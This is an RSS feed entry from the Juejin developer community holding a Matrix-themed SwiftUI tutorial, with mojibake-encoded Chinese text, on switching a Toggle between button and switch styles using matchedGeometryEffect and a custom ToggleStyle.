<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[SwiftUI æ¶¨çŸ¥è¯†ï¼šå¦‚ä½•æŒ‰æ¡ä»¶åŠ¨æ€åˆ‡æ¢ Toggle è§†å›¾çš„æ ·å¼ï¼ˆ.button æˆ– .switchï¼‰]]></title>    <link>https://juejin.cn/post/7589166195797131291</link>    <guid>https://juejin.cn/post/7589166195797131291</guid>    <pubDate>2025-12-30T02:19:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589166195797131291" data-draft-id="7589126920287600650" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SwiftUI æ¶¨çŸ¥è¯†ï¼šå¦‚ä½•æŒ‰æ¡ä»¶åŠ¨æ€åˆ‡æ¢ Toggle è§†å›¾çš„æ ·å¼ï¼ˆ.button æˆ– .switchï¼‰"/> <meta itemprop="keywords" content="Swift,SwiftUI,Apple"/> <meta itemprop="datePublished" content="2025-12-30T02:19:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§ç†ŠçŒ«ä¾¯ä½©"/> <meta itemprop="url" content="https://juejin.cn/user/4292907536222152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SwiftUI æ¶¨çŸ¥è¯†ï¼šå¦‚ä½•æŒ‰æ¡ä»¶åŠ¨æ€åˆ‡æ¢ Toggle è§†å›¾çš„æ ·å¼ï¼ˆ.button æˆ– .switchï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292907536222152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§ç†ŠçŒ«ä¾¯ä½©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:19:00.000Z" title="Tue Dec 30 2025 02:19:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e475395469c1463f8daf617e1336e341~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=YTmqDIvgnqKYHadwDfHnPAyAWUA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<blockquote>
<p>ğŸ•¶ï¸ åä¸‹è¿™é¢—çº¢è‰²è¯ä¸¸ï¼Œæ‰“ç ´ SwiftUI çš„ç‰©ç†æ³•åˆ™
æ¬¢è¿æ¥åˆ°æ–°åº“æ¯”è’‚è¯ºå¸‚çš„é›¨å¤œã€‚åœ¨è¿™é‡Œï¼ŒSwiftUI çš„ ToggleStyle æ›¾è¢«è®¤ä¸ºæ˜¯ä¸å¯å˜æ›´æ”¹çš„é“å¾‹â€”â€”Switch å°±æ˜¯ Switchï¼ŒButton å°±æ˜¯ Buttonï¼Œä¸¤è€…è€æ­»ä¸ç›¸å¾€æ¥ã€‚ä½†å½“æŒ‘å‰”çš„è®¾è®¡å¸ˆ Trinity ç”©å‡ºä¸€å¼ è¦æ±‚â€œè§†å›¾æ— ç¼æ¶²æ€å˜å½¢â€çš„å›¾çº¸ï¼Œè€Œå¤§åæ´¾â€œé‡æ„ç‰¹å·¥â€æ­£è™è§†çœˆçœˆå‡†å¤‡å˜²ç¬‘ä½ çš„ä»£ç æ—¶ï¼Œä½ è¯¥æ€ä¹ˆåŠï¼Ÿ <br/>
åˆ«æ…Œï¼Œæˆ‘æ˜¯ Neoã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†å¸¦ä½ æ½œå…¥ ToggleStyle çš„åº•å±‚é»‘ç®±ï¼Œåˆ©ç”¨ matchedGeometryEffectï¼ˆé‡å­çº ç¼ ï¼‰ å’Œ ç”Ÿå‘½å‘¨æœŸä¾èµ–æ³¨å…¥ï¼Œä¸Šæ¼”ä¸€åœºéª—è¿‡ç¼–è¯‘å™¨çš„â€œç§»èŠ±æ¥æœ¨â€å¤§æˆã€‚å‡†å¤‡å¥½äº†å—ï¼Ÿè®©æˆ‘ä»¬ä¸€èµ· Hack è¿›ç³»ç»Ÿï¼Œåˆ›é€ é‚£ä¸ªâ€œä¸å¯èƒ½â€çš„å¼€å…³ã€‚</p>
</blockquote>
<h2 data-id="heading-0">â˜”ï¸ å¼•å­</h2>
<p>è¿™æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨æ–°åº“æ¯”è’‚è¯ºå¸‚ï¼ˆNew Cupertino Cityï¼‰åœ°ä¸‹ä»£ç é»‘å¸‚çš„æ•…äº‹ã€‚é›¨ä¸€ç›´åœ¨ä¸‹ï¼Œåƒæäº†é‚£ä¸ªæ°¸è¿œä¿®ä¸å®Œçš„ Memory Leakã€‚</p>
<p>æˆ‘æ˜¯ <strong>Neo</strong>ï¼Œä¸€åä¸“æ²»å„ç§ SwiftUI ç–‘éš¾æ‚ç—‡çš„â€œæ¸…ç†è€…â€ã€‚ååœ¨æˆ‘å¯¹é¢çš„æ˜¯ <strong>Trinity</strong>ï¼Œå¥¹æ˜¯è¿™ä¸ªè¡—åŒºæœ€æŒ‘å‰”çš„ UX è®¾è®¡å¸ˆã€‚è€Œé‚£ä¸ªæ€»æƒ³æŠŠæˆ‘ä»¬çš„ä»£ç é‡æ„æˆæ±‡ç¼–è¯­è¨€çš„å¤§åæ´¾ <strong>Agent Refactorï¼ˆé‡æ„ç‰¹å·¥ï¼‰</strong>ï¼Œæ­£èº²åœ¨ç¼–è¯‘å™¨çš„é˜´å½±é‡Œä¼ºæœºè€ŒåŠ¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fffb9f71011c49c5a7a9e11cafe6da97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=FupUPJ87VexlC1AgBI5o7ZqlCbc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Trinity æç­äº†æ‰‹é‡Œçš„é¦™çƒŸï¼Œç”©ç»™æˆ‘ä¸€å¼ è®¾è®¡ç¨¿ï¼šâ€œNeoï¼Œæˆ‘è¦ä¸€ä¸ªå¼€å…³ã€‚å¹³æ—¶å®ƒæ˜¯ Switchï¼Œæ¿€åŠ¨çš„æ—¶å€™å®ƒå¾—å˜æˆ Buttonã€‚è€Œä¸”ï¼Œå˜åŒ–è¿‡ç¨‹è¦åƒä¸ç»¸ä¸€æ ·é¡ºæ»‘ï¼Œä¸èƒ½æœ‰ä»»ä½•â€˜è·³å¸§â€™ã€‚æ‡‚äº†å—ï¼Ÿâ€</p>
<p><strong>åœ¨æœ¬ç¯‡åšæ–‡ä¸­ï¼Œæ‚¨å°†å­¦åˆ°å¦‚ä¸‹å†…å®¹ï¼š</strong></p>
<ul>
<li>â˜”ï¸ å¼•å­</li>
<li>ğŸ•µï¸â€â™‚ï¸ æ¡ˆå‘ç°åœºï¼šé™æ€ç±»å‹çš„æ¡æ¢</li>
<li>ğŸ§¬ ç¬¬ä¸€æ‹›ï¼šé‡å­çº ç¼ ï¼ˆmatchedGeometryEffectï¼‰</li>
<li>ğŸ’Š ç»ˆææ–¹æ¡ˆï¼šè‡ªå®šä¹‰ ToggleStyle é‡Œçš„â€œç§»èŠ±æ¥æœ¨â€</li>
<li>âš ï¸ æŠ€æœ¯é»‘ç®±ï¼ˆé‡ç‚¹è§£æï¼‰</li>
<li>ğŸ¬ å¤§ç»“å±€ï¼šå®Œç¾çš„è°ƒç”¨</li>
<li>ğŸ‘€ SwiftUI æ¶¨çŸ¥è¯†å¤–ä¼ ï¼šä¿®å¤â€œåŠ¨ç”»å¤±æ•ˆâ€çš„ç»ˆæè¡¥ä¸ï¼ˆNamespace çš„ç”Ÿå‘½å‘¨æœŸï¼‰</li>
<li>ğŸ•µï¸â€â™‚ï¸ çœŸæ­£çš„ Bugï¼šNamespace çš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>ğŸ’‰ æ‰‹æœ¯æ–¹æ¡ˆï¼šä¾èµ–æ³¨å…¥</li>
<li>ğŸ§¬ æœ€ç»ˆä¿®æ­£ç‰ˆä»£ç  (Copy-Paste Ready)</li>
<li>ğŸ§  æŠ€æœ¯å¤ç›˜ï¼šä¸ºä»€ä¹ˆè¿™èƒ½è¡Œï¼Ÿ</li>
</ul>
<p>æˆ‘çš±äº†çš±çœ‰ï¼šâ€œSwiftUI çš„ <code>ToggleStyle</code> æ˜¯é™æ€ç±»å‹ç»‘å®šçš„ï¼Œä½ è¦åœ¨è¿è¡Œæ—¶<strong>å·æ¢æ¢æŸ±</strong>ï¼Ÿè¿™å¯æ˜¯<strong>é€†å¤©æ”¹å‘½</strong>çš„æ“ä½œã€‚â€</p>
<p>Trinity å†·ç¬‘ä¸€å£°ï¼šâ€œåšä¸åˆ°ï¼Ÿé‚£æˆ‘å°±å»æ‰¾ Agent Refactorï¼Œå¬è¯´ä»–æœ€è¿‘åœ¨æ¨è¡Œ UIKit å¤è¾Ÿè¿åŠ¨ã€‚â€</p>
<p>â€œæ…¢ç€ã€‚â€æˆ‘æŒ‰ä½å¥¹çš„æ‰‹ï¼Œæ‰“å¼€äº† Xcodeï¼Œâ€œç»™æˆ‘ååˆ†é’Ÿã€‚â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6826748561ed45e6a6573552cf9c684b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=9gbt%2BZfffCpyH5%2Bd5ryaUxKVojU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">ğŸ•µï¸â€â™‚ï¸ æ¡ˆå‘ç°åœºï¼šé™æ€ç±»å‹çš„æ¡æ¢</h2>
<p>åœ¨ SwiftUI çš„ä¸–ç•Œæ³•åˆ™é‡Œï¼Œ<strong>ç±»å‹å³å‘½è¿</strong>ã€‚é€šå¸¸æˆ‘ä»¬å†™ <code>Toggle</code>ï¼Œä¸€æ—¦æŒ‡å®šäº† <code>.toggleStyle(.switch)</code>ï¼Œå®ƒè¿™è¾ˆå­å°±æ˜¯ä¸ª Switch äº†ã€‚</p>
<p>å¦‚æœä½ å¤©çœŸåœ°å†™å‡ºè¿™ç§ä»£ç ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">if</span> change {
    <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Click Me"</span>, isOn: <span class="hljs-variable">$state</span>).toggleStyle(.button)
} <span class="hljs-keyword">else</span> {
    <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Click Me"</span>, isOn: <span class="hljs-variable">$state</span>).toggleStyle(.switch)
}
</code></pre>
<p><strong>Agent Refactor</strong> ä¼šç¬‘æ‰å¤§ç‰™ã€‚ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºåœ¨ SwiftUI çœ‹æ¥ï¼Œè¿™æ˜¯<strong>ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„ View</strong>ã€‚å½“ <code>change</code> æ”¹å˜æ—¶ï¼Œæ—§è§†å›¾è¢«æ— æƒ…é”€æ¯ï¼Œæ–°è§†å›¾å‡­ç©ºé‡å»ºã€‚è¿™ä¼šå¯¼è‡´åŠ¨ç”»ç”Ÿç¡¬å¾—åƒä¸ªåˆšå­¦ä¼šèµ°è·¯çš„åƒµå°¸ï¼Œç”šè‡³ä¼šä¸¢å¤±ç‚¹å‡»æ—¶çš„æŒ‰ä¸‹çŠ¶æ€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3736f08c46564b7595eb1afe351345f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=AiLajDChrpV29mREeFHiQz%2BCFgc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æˆ‘ä»¬éœ€è¦çš„æ˜¯ä¸€ç§<strong>ç’å¤©è¿‡æµ·</strong>çš„æ‰‹æ®µï¼Œè®© SwiftUI ä»¥ä¸ºå®ƒè¿˜åœ¨æ¸²æŸ“åŒä¸€ä¸ª Viewï¼Œä½†çš®å›Šå·²ç»æ¢äº†ã€‚</p>
<h2 data-id="heading-2">ğŸ§¬ ç¬¬ä¸€æ‹›ï¼šé‡å­çº ç¼ ï¼ˆmatchedGeometryEffectï¼‰</h2>
<p>Trinity çœ‹ç€å±å¹•ä¸Šçš„é—ªçƒï¼Œä¸è€çƒ¦åœ°æ•²ç€æ¡Œå­ã€‚æˆ‘æ·±å¸ä¸€å£æ°”ï¼Œç¥­å‡ºäº†ç¥å™¨ï¼š<code>matchedGeometryEffect</code>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/865fb2f50e1c4080929d61bda3edeb95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=0cDB9IfDoJITaQLVd2482CRDhFc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¿™ä¸œè¥¿å°±åƒæ˜¯è§†å›¾ç•Œçš„â€œé‡å­çº ç¼ â€ã€‚è™½ç„¶æˆ‘ä»¬åœ¨ä»£ç é‡Œå†™äº†ä¸¤ä¸ª Toggleï¼Œä½†é€šè¿‡ç»Ÿä¸€çš„ <code>Namespace</code> å’Œ <code>ID</code>ï¼Œæˆ‘ä»¬å¯ä»¥éª—è¿‡æ¸²æŸ“å¼•æ“ï¼Œè®©å®ƒä»¥ä¸ºè¿™ä¿©æ˜¯å‰ä¸–ä»Šç”Ÿã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ViewSwitchingStrategy</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå‘½åç©ºé—´ï¼Œç”¨äºé­”æœ¯èˆ¬çš„å‡ ä½•åŒ¹é…</span>
    <span class="hljs-meta">@Namespace</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> space
    <span class="hljs-comment">// ç»™è¿™ä¸¤ä¸ªå½¢æ€èµ·ä¸ªä»£å·ï¼Œå°±åƒç‰¹å·¥çš„å‡å</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">AnimID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"MorphingToggle"</span>
    
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">var</span> isButtonStyle <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">var</span> isOn <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-comment">// å‰§æƒ…åˆ†æ”¯ï¼šæ ¹æ®çŠ¶æ€æ¸²æŸ“ä¸åŒçš®å›Š</span>
            <span class="hljs-keyword">if</span> isButtonStyle {
                <span class="hljs-type">Toggle</span>(isOn: <span class="hljs-variable">$isOn</span>) {
                    <span class="hljs-type">Text</span>(<span class="hljs-string">"èŠéº»å¼€é—¨"</span>)
                        <span class="hljs-comment">// å…³é”®ç‚¹ï¼šæ ‡è®°è¿™ä¸ª Text çš„å‡ ä½•ç‰¹å¾</span>
                        .matchedGeometryEffect(id: <span class="hljs-type">AnimID</span>, in: space)
                }
                .toggleStyle(.button)
                <span class="hljs-comment">// åŠ ä¸Šè¿‡æ¸¡åŠ¨ç”»ï¼Œè®©åˆ‡æ¢ä¸é‚£ä¹ˆçªå…€</span>
                .transition(.scale(scale: <span class="hljs-number">0.8</span>).combined(with: .opacity))
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-type">Toggle</span>(isOn: <span class="hljs-variable">$isOn</span>) {
                    <span class="hljs-type">Text</span>(<span class="hljs-string">"èŠéº»å¼€é—¨"</span>)
                        <span class="hljs-comment">// å…³é”®ç‚¹ï¼šåŒä¸€ä¸ª IDï¼ŒåŒä¸€ä¸ªç©ºé—´</span>
                        .matchedGeometryEffect(id: <span class="hljs-type">AnimID</span>, in: space)
                }
                .toggleStyle(.switch)
                .transition(.scale(scale: <span class="hljs-number">0.8</span>).combined(with: .opacity))
            }
            
            <span class="hljs-type">Button</span>(<span class="hljs-string">"å˜å½¢ï¼"</span>) {
                withAnimation(.spring()) {
                    isButtonStyle.toggle()
                }
            }
        }
        .padding()
    }
}
</code></pre>
<p>Trinity çœ¯èµ·çœ¼ç›çœ‹äº†ä¸€ä¼šå„¿ï¼šâ€œæœ‰ç‚¹æ„æ€ã€‚æ–‡å­—å¹³æ»‘è¿‡æ¸¡äº†ï¼Œä½† Toggle çš„å¤–å£³è¿˜æ˜¯æœ‰ç‚¹â€˜é—ªç°â€™ã€‚è€Œä¸”â€¦â€¦è¿™ä»£ç å¤ªä¹±äº†ï¼Œæˆ‘æœ‰æ´ç™–ã€‚â€</p>
<p>å¥¹è¯´å¾—å¯¹ã€‚æŠŠé€»è¾‘æ•£è½åœ¨ View Body é‡Œç®€ç›´æ˜¯<strong>ç”»è›‡æ·»è¶³</strong>ã€‚æˆ‘ä»¬éœ€è¦æ›´é«˜çº§çš„å°è£…ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d46f035b388c46b9882a620b57ee8bbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=RUZ2Ylyf9jWXMXGTzZO2XI87cV8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-3">ğŸ’Š ç»ˆææ–¹æ¡ˆï¼šè‡ªå®šä¹‰ ToggleStyle é‡Œçš„â€œç§»èŠ±æ¥æœ¨â€</h2>
<p>æˆ‘å†³å®šä¸å†åœ¨ View å±‚é¢ä¸Šçº ç»“ï¼Œè€Œæ˜¯æ·±å…¥åˆ° <code>ToggleStyle</code> çš„å†…éƒ¨ã€‚æˆ‘è¦åˆ›é€ ä¸€ä¸ª<strong>åŒé¢é—´è°</strong> Styleã€‚</p>
<p>è¿™ä¸ª Style è¡¨é¢ä¸Šæ˜¯ä¸€ä¸ªæ™®é€šçš„ <code>ToggleStyle</code>ï¼Œä½†å®ƒçš„ <code>makeBody</code> æ–¹æ³•é‡Œè—ç€ä¸¤ä¸ªçµé­‚ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªâ€œåŒé‡äººæ ¼â€çš„ Style</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ConditionalToggleStyle</span>: <span class="hljs-title class_">ToggleStyle</span> {
    <span class="hljs-comment">// åŒæ ·éœ€è¦å‘½åç©ºé—´æ¥å¤„ç†å¸ƒå±€å¹³æ»‘è¿‡æ¸¡</span>
    <span class="hljs-meta">@Namespace</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> space
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">GeometryID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Chameleon"</span> <span class="hljs-comment">// å˜è‰²é¾™ ID</span>
    
    <span class="hljs-comment">// æ§åˆ¶å½“å‰æ˜¾ç¤ºå“ªä¸ªäººæ ¼</span>
    <span class="hljs-keyword">var</span> isButtonMode: <span class="hljs-type">Bool</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeBody</span>(<span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-comment">// è¿™é‡Œæ˜¯é»‘è‰²å¹½é»˜çš„åœ°æ–¹ï¼š</span>
        <span class="hljs-comment">// æˆ‘ä»¬åœ¨ä¸€ä¸ª Style é‡Œæ‰‹åŠ¨è°ƒç”¨äº†å¦å¤–ä¸¤ä¸ª Style çš„ makeBody</span>
        <span class="hljs-comment">// è¿™å°±åƒæ˜¯ä½ å»ä¹°å’–å•¡ï¼Œåº—å‘˜å…¶å®æ˜¯å»éš”å£æ˜Ÿå·´å…‹ä¹°äº†ä¸€æ¯å€’ç»™ä½ </span>
        
        <span class="hljs-type">Group</span> {
            <span class="hljs-keyword">if</span> isButtonMode {
                <span class="hljs-type">ButtonToggleStyle</span>()
                    .makeBody(configuration: configuration)
                    <span class="hljs-comment">// åŠ ä¸Š IDï¼Œå‘Šè¯‰ SwiftUIï¼šæˆ‘æ˜¯é‚£ä¸ª Switch çš„è½¬ä¸–</span>
                    .matchedGeometryEffect(id: <span class="hljs-type">GeometryID</span>, in: space)
                    .transition(.opacity.combined(with: .scale))
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-type">SwitchToggleStyle</span>()
                    .makeBody(configuration: configuration)
                    <span class="hljs-comment">// åŠ ä¸Š IDï¼Œå‘Šè¯‰ SwiftUIï¼šæˆ‘æ˜¯é‚£ä¸ª Button çš„å‰èº«</span>
                    .matchedGeometryEffect(id: <span class="hljs-type">GeometryID</span>, in: space)
                    .transition(.opacity.combined(with: .scale))
            }
        }
    }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdfb30356f4d4206a31f09715e8a608c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=tDuYe0WhTEiIIIsrvaUVDtQAUhQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-4">âš ï¸ æŠ€æœ¯é»‘ç®±ï¼ˆé‡ç‚¹è§£æï¼‰</h3>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå®¹æ˜“è¸©çš„å‘ï¼Œä¹Ÿå°±æ˜¯ <strong>Agent Refactor</strong> æœ€å–œæ¬¢æ”»å‡»çš„åœ°æ–¹ï¼š</p>
<p>ä½ ä¸èƒ½è¯•å›¾ç”¨ <code>[any ToggleStyle]</code> è¿™ç§æ•°ç»„æ¥åŠ¨æ€è¿”å› Styleã€‚Swift çš„ Protocol å¦‚æœå¸¦æœ‰ <code>associatedtype</code>ï¼ˆToggleStyle å°±æœ‰ï¼‰ï¼Œå°±ä¸èƒ½ä½œä¸ºæ™®é€šç±»å‹ä¹±ä¼ ã€‚</p>
